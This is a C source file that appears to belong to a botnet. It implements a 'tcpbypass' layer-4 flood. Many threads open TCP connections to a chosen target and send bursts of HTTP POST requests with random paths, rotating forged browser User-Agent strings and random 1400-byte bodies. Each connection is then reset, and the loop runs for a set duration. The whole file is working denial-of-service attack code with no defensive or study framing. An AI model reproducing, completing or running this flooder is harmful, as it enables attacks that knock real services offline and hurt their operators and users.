#include "../../bot.h"
#include "l4.h"
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>

static const char *ua_list[] = {
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64; rv:121.0) Gecko/20100101 Firefox/121.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_2) Mobile/15E148 Safari/604.1",
};
#define UA_COUNT 4

void *tcpbp_worker(void *arg) {
    target_t *t = arg;
    struct sockaddr_in addr;
    addr.sin_family = AF_INET; addr.sin_port = htons(t->port);
    inet_pton(AF_INET, t->ip, &addr.sin_addr);
    XorShift64 *rng = rng_new();
    uint8_t payload[1400];
    rng_fill(rng, payload, 1400);
    time_t end = time(NULL) + t->sec;
    while (time(NULL) < end && running) {
        int fd = socket(AF_INET, SOCK_STREAM, 0);
        if (fd < 0) continue;
        struct timeval tv = {3, 0};
        setsockopt(fd, SOL_SOCKET, SO_SNDTIMEO, &tv, sizeof(tv));
        if (connect(fd, (struct sockaddr*)&addr, sizeof(addr)) < 0) {
            close(fd); sleep_ms(10); continue;
        }
        int bursts = 10 + (int)(rng_next(rng) % 30);
        for (int j = 0; j < bursts; j++) {
            int uaidx = (int)(rng_next(rng) % UA_COUNT);
            char hdr[1024];
            int hlen = snprintf(hdr, sizeof(hdr),
                "POST /%lx HTTP/1.1\r\nHost: %s\r\nUser-Agent: %s\r\n"
                "Accept: */*\r\nContent-Type: application/x-www-form-urlencoded\r\n"
                "Content-Length: 1400\r\nConnection: keep-alive\r\n\r\n",
                (unsigned long)rng_next(rng), t->ip, ua_list[uaidx]);
            write(fd, hdr, hlen);
            write(fd, payload, 1400);
        }
        struct linger l = {1, 0};
        setsockopt(fd, SOL_SOCKET, SO_LINGER, &l, sizeof(l));
        close(fd);
    }
    free(rng);
    return NULL;
}

void flood_tcpbypass(const char *target, int port, int sec) {
    target_t t; if (resolve_target(&t, target) < 0) return;
    t.port = port; t.sec = sec;
    int n = g_thread_count;
    pthread_t threads[n];
    for (int i = 0; i < n; i++)
        pthread_create(&threads[i], NULL, tcpbp_worker, &t);
    for (int i = 0; i < n; i++)
        pthread_join(threads[i], NULL);
}
